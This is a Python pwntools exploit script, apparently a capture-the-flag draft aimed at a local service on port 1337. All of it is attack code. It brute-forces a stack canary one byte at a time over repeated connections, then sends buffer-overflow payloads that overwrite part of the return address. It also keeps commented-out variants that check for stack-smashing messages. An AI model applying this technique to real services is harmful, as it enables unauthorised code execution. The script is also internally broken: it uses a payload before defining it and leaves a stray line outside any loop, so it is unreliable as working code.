from pwn import *

context.arch = 'amd64'
context.encoding ='latin'
context.log_level = 'INFO'
warnings.simplefilter('ignore')

# (131)\x83 (58)\x3a (172)\xac (203)\xcb (160)\xa0 () ()

for n in range(8):
    for i in range( 256 ): 
        with remote('localhost', 1337) as p:
            print(f'n={n}, i ={i}')
            p.readrepeat(1)
            p.sendline(b'1000')
            p.readrepeat(1)
            p.send(payload + p8(i))
            s = p.readrepeat(1)
            info(s)

for i in range(16): 
    with remote('localhost', 1337) as p:
            # print(f'n={n}, i ={i}')
            payload = b'a'*24 + b'\0' + b'\x83' + b'\x3a' + b'\xac' +b'\xcb' + b'\xa0' + b'\xb4' + b'\xc7' + b'b'*8 + b'\x73' + p8(0x07+(16*i))
            info(p.readrepeat(1))
            p.sendline(b'1000')
            info(p.readrepeat(1))
            p.send(payload)
            s = p.readrepeat(1)
            info(s)



                
            
payload = b'a'*24 + b'\0' + b'\x83' + b'\x3a' + b'\xac' +b'\xcb' + b'\xa0' + b'' + b'' + b'b'*8 + b'\x73' + p8(0x09+(16*i))


       
        # print(hex(i))
        # payload = b'a'*(88)+b'\0'
        # payload = payload + p8(0xa1) + p8(0xbe) + p8(0xb2) + p8(0x4a) + p8(0xae) + p8(0xb5) + p8(0x7f) + b'b'*8 + b'\x77' + p8(0x09+(16*i))
        # p.readrepeat(1)
        # p.sendline(b'1000')
        # p.readrepeat(1)
        # p.send(payload)
        # p.readuntil(b'Goodbye!')
        # info(p.readrepeat(1))
        # if b"*** stack" in s: 
        #     print("smashing")
        # else: 
        #     break
        # 61 a1 be b2 4a ae b5 7f



